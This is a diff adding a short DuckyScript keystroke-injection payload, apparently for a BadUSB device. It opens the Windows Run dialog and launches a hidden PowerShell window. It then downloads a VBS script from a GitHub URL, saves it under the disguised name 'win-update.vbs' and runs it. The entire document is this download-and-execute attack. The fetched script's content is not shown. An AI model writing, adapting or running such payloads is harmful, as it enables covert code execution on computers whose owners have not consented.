@@ -1,0 +1,5 @@
+REM Author: sysgerm @ CosmodiumCS
+GUI r
+DELAY 500
+STRING powershell.exe -WindowStyle hidden -C cd C:\\Windows\Temp; Invoke-WebRequest -URI 'https://raw.githubusercontent.com/sysgerm/FlipTheScripts/main/resources/beemovie.vbs' -OutFile win-update.vbs; .\win-update.vbs
+ENTER
